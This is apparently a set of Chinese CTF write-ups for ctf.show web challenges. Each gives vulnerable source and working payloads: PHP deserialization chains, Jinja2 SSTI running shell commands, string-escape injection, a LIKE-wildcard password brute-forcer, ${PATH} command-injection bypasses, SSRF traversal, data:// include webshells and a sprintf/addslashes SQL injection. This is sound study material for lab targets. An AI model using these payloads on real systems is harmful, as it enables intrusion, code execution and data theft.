class="comment">//O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=h1nt.txt&quot;;s:4:&quot;coos&quot;;s:13:&quot;SplFileObject&quot;;&#125;s:4:&quot;eeee&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>读出来的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#用于check.php</span><br><span class="line"></span><br><span class="line">key：qwertyuiopasdfghjklzxcvbnm123456789</span><br><span class="line"></span><br><span class="line">move：2~4</span><br></pre></td></tr></table></figure>

<p>也可以用此法读取check.php</p>
<p>或者利用filie_getcontent 读取check.php,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;s:1:&quot; &quot;;s:3:&quot;key&quot;;R:2;s:4:&quot;file&quot;;s:11:&quot;./check.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cipher</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)&gt;<span class="number">10000</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$shift</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$shifted</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$new_pos</span> = (<span class="variable">$pos</span> - <span class="variable">$shift</span> + <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>)) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>);</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$charset</span>[<span class="variable">$new_pos</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$char</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$shifted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decipher</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$shift</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$original</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$new_pos</span> = (<span class="variable">$pos</span> + <span class="variable">$shift</span>) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>);</span><br><span class="line">            <span class="variable">$original</span> .= <span class="variable">$charset</span>[<span class="variable">$new_pos</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$original</span> .= <span class="variable">$char</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$original</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decipher</span>(<span class="string">&quot;p8vfuv8g8v8py&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>最终payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">EeE</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;text = <span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;text -&gt;coos = <span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;text -&gt;coos -&gt;aaa = <span class="keyword">new</span> <span class="title function_ invoke__">cycycycy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>?get&#x3D;fe1ka1ele1efp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:3:&quot;xxx&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><p>查看原码发现app.zip 访问下载，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/hello/&#x27;)</span><br><span class="line">def hello(name=None):</span><br><span class="line">    return render_template(&#x27;hello.html&#x27;,name=name)</span><br><span class="line">@app.route(&#x27;/hello/&lt;name&gt;&#x27;)</span><br><span class="line">def hellodear(name):</span><br><span class="line">    if &quot;ge&quot; in name:</span><br><span class="line">        return render_template_string(&#x27;hello %s&#x27; % name)</span><br><span class="line">    elif &quot;f&quot; not in name:</span><br><span class="line">        return render_template_string(&#x27;hello %s&#x27; % name)</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;Nonononon&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>hello&#x2F;目录下进行模板注入，注入字符含有‘ge’或者没有f</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/hello/&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[83].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo Y2F0IC9mbGFn |base64 -d|sh&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><h2 id><a href="#" class="headerlink" title></a></h2><h1 id="月饼杯"><a href="#月饼杯" class="headerlink" title="月饼杯"></a>月饼杯</h1><h2 id="web1-此夜圆"><a href="#web1-此夜圆" class="headerlink" title="web1_此夜圆"></a>web1_此夜圆</h2><p>下载附件如下    </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">	public $uname;</span><br><span class="line">	public $password;</span><br><span class="line">	public function __construct($uname,$password)</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;uname=$uname;</span><br><span class="line">		$this-&gt;password=$password;</span><br><span class="line">	&#125;</span><br><span class="line">	public function __wakeup()</span><br><span class="line">	&#123;</span><br><span class="line">			if($this-&gt;password===&#x27;yu22x&#x27;)</span><br><span class="line">			&#123;</span><br><span class="line">				include(&#x27;flag.php&#x27;);</span><br><span class="line">				echo $flag;	</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				echo &#x27;wrong password&#x27;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$uname=$_GET[1];</span><br><span class="line">$password=1;</span><br><span class="line">$ser=filter(serialize(new a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>字符串增多逃逸，测试如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password=&#x27;123&#x27;;</span><br><span class="line">    public function __construct($uname,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname=$uname;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;password===&#x27;yu22x&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &#x27;wrong password&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$uname=&#x27;FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&#x27;;</span><br><span class="line">$password=1;</span><br><span class="line">$ser=filter(serialize(new a($uname,$password)));</span><br><span class="line">echo $ser.&quot;\n&quot;;</span><br><span class="line">var_dump(unserialize($ser));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web3-莫负婵娟"><a href="#web3-莫负婵娟" class="headerlink" title="web3_莫负婵娟"></a>web3_莫负婵娟</h2><p>看提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt;</span><br></pre></td></tr></table></figure>

<p>这里的话大部分字符都被过滤了，但是_(下划线)没有，添加N个 _ (下划线）可以知道密码长度为32</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like 模糊匹配</span><br><span class="line"></span><br><span class="line">% 表示零个或多个字符的任意字符串</span><br><span class="line">_（下划线）表示任何单个字符</span><br><span class="line">[ ] 表示指定范围 ([a-f]) 或集合 ([abcdef]) 中的任何单个字符</span><br><span class="line">[^] 不属于指定范围 ([a-f]) 或集合 ([abcdef]) 的任何单个字符</span><br><span class="line">* 它同于DOS命令中的通配符，代表多个字符</span><br><span class="line">？同于DOS命令中的？通配符，代表单个字符</span><br><span class="line"># 大致同上，不同的是代只能代表单个数字</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://95d50cc2-b9e1-475d-bb11-57d5b689f34a.challenge.ctf.show/login.php&quot;</span><br><span class="line"></span><br><span class="line">password=&quot;&quot;</span><br><span class="line">length=32</span><br><span class="line">result=&quot;67815b0c009ee970fe4014abaa3Fa6A0&quot;</span><br><span class="line">for i in range(0,33):</span><br><span class="line">    for j in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;:</span><br><span class="line">        payload=password+j+&quot;_&quot;*(31 - len(password))</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;username&quot;:&quot;yu22x&quot;,</span><br><span class="line">            &quot;password&quot;:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        if &quot;wrong&quot; not in r:</span><br><span class="line">            print(payload)</span><br><span class="line">            password+=j</span><br><span class="line">          #  print(password)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>fuzz了一下可以使用的字符有<code>大写字母，数字，&#123; &#125;，空格，$，~</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span><br></pre></td></tr></table></figure>

<p>截取变量$PATH 从左向右第六个字符的一个</p>
<p><img src="/2023/05/22/ctfshow%E5%90%88%E9%9B%86-ctfshow/QQ%E6%88%AA%E5%9B%BE20230528192948.png"></p>
<p>[(12条消息) linux 中${ }截取变量字符串_沉浸致远的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_44244371/article/details/103539800#:~:text=linux">https://blog.csdn.net/weixin_44244371/article/details/103539800#:~:text=linux</a> 中%24 { }截取变量字符串 1 %23号截取，删除左边字符，保留右边字符。 代码如下%3A echo,从左边第几个字符开始，一直到结束。 … 7 从右边第几个字符开始，及字符的个数。 … 8 从右边第几个字符开始，一直到结束。 )</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/base64 flag.php</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;$&#123;PATH::1&#125;???$&#123;PATH::1&#125;????64 ????.???</span><br></pre></td></tr></table></figure>

<h2 id="web2-故人心"><a href="#web2-故人心" class="headerlink" title="web2_故人心"></a>web2_故人心</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">$url[1]=$_POST[&#x27;url&#x27;];</span><br><span class="line">if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123;</span><br><span class="line">    $d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)));</span><br><span class="line">    if($d)&#123;</span><br><span class="line">             highlight_file(&#x27;hint.php&#x27;);</span><br><span class="line">             if(filter_var($url[1],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                $host=parse_url($url[1]);</span><br><span class="line">                print_r($host); </span><br><span class="line">                if(preg_match(&#x27;/ctfshow\.com$/&#x27;,$host[&#x27;host&#x27;]))&#123;</span><br><span class="line">                    print_r(file_get_contents($url[1]));</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo &#x27;差点点就成功了！&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &#x27;please give me url!!!&#x27;;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;想一想md5碰撞原理吧?!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;第一个都过不了还想要flag呀?!&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>php小数点超过161位做平方运算时会被截断，我们可以用科学计数法绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#x27;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=100;$i&lt;999;$i++)&#123;</span><br><span class="line">    $b = &quot;0e&quot;.$i.&quot;024452&quot;;</span><br><span class="line">    if($b==hash(&quot;md2&quot;, $b))&#123;</span><br><span class="line">        echo $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">for ($i=1000;$i&lt;9999;$i++)&#123;</span><br><span class="line">    $c = &quot;0e&quot;.$i.&quot;48399&quot;;</span><br><span class="line">    if($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)))&#123;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=1e-162&amp;b=0e652024452&amp;c=0e603448399</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents使用不存在的协议名导致目录穿越，实现SSRF</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=hhh://ctfshow.com/../../../../../fl0g.txt</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/NPFS/p/13747354.html">ctfshow 月饼杯 Web writeup - NPFS - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/rfrder/article/details/113274503">(12条消息) CTFSHOW 月饼杯 web_ctfshow web3_莫负婵娟_bfengj的博客-CSDN博客</a></p>
<h1 id="36D练手赛"><a href="#36D练手赛" class="headerlink" title="36D练手赛"></a>36D练手赛</h1><h2 id="不知所措-jpg"><a href="#不知所措-jpg" class="headerlink" title="不知所措.jpg"></a>不知所措.jpg</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=test/../index.</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$file=$file.&#x27;php&#x27;;</span><br><span class="line">echo $file.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">if(preg_match(&#x27;/test/is&#x27;,$file))</span><br><span class="line">&#123;	include ($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;$file must has test&#x27;;</span><br><span class="line">&#125;?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php%20system(%27cat%20/F*%27);?&gt;test</span><br></pre></td></tr></table></figure>

<h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><h1 id="萌新赛"><a href="#萌新赛" class="headerlink" title="萌新赛"></a>萌新赛</h1><h2 id="给她"><a href="#给她" class="headerlink" title="给她"></a>给她</h2><p>git泄露，githack下载源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#x27;admin&#x27;&amp;pass=123%1$&#x27; or 1=1--+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: file=2F666C6167</span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL</span><br><span class="line">$input = addslashes (&quot;%1$&#x27; or 1=1#&quot; );</span><br><span class="line">$b = sprintf (&quot;AND b=&#x27;%s&#x27;&quot;, $input );</span><br><span class="line">echo $b;</span><br><span class="line">echo &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">$sql = sprintf (&quot;SELECT * FROM t WHERE a=&#x27;%s&#x27; $b &quot;, &#x27;admin&#x27; );</span><br><span class="line">//对$input与$b进行了拼接</span><br><span class="line">//$sql = sprintf (&quot;SELECT * FROM t WHERE a=&#x27;%s&#x27; AND b=&#x27;%1$\&#x27; and 1=1#&#x27; &quot;, &#x27;admin&#x27; );</span><br><span class="line">//很明显，这个句子里面的\是由addsashes为了转义单引号而加上的，使用%s与%1$\类匹配admin，那么admin只会出现在%s里，%1$\为空</span><br><span class="line">echo  $sql ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="假赛生"><a href="#假赛生" class="headerlink" title="假赛生"></a>假赛生</h2><p><a href="https://blog.csdn.net/qq_46456049/article/details/108589822">(12条消息) php(正则匹配)_php 正则匹配_sweetheart7-7的博客-CSDN博客</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&#x27;select pass from user where name=&quot;&#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;4rfvbgt56yhn.sh&#x27;</span>);</span><br><span class="line">    <span class="variable">$query</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$name</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;admin!!!!!&quot;</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&quot;/\w\W*/&quot;</span>,function()&#123;<span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);&#125;,<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>],<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you not admin&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\d : 数字。  \D : 除了数字。</span><br><span class="line">\w : 数字，字母，下划线。\W : 除了数字，字母，下划线。</span><br><span class="line">\s  : 空白符 。 \S : 除了空白符  。</span><br></pre></td></tr></table></figure>



<p>注册一个一个账号</p>
<p>账号 admin空格</p>
<p> 密码随意；登录，他把所有字符都过滤了，那不穿就行了</p>
<p>payload：index.php?c&#x3D;</p>
<h1 id="单身杯"><a href="#单身杯" class="headerlink" title="单身杯"></a>单身杯</h1><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$file</span>)==<span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>strrev，字符反转函数?&gt;，进行闭合，后面不影响</p>
<p>伪协议读取，</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php eval($_POST[1]);?&gt;&gt;?;)]1[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;1=system(&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>

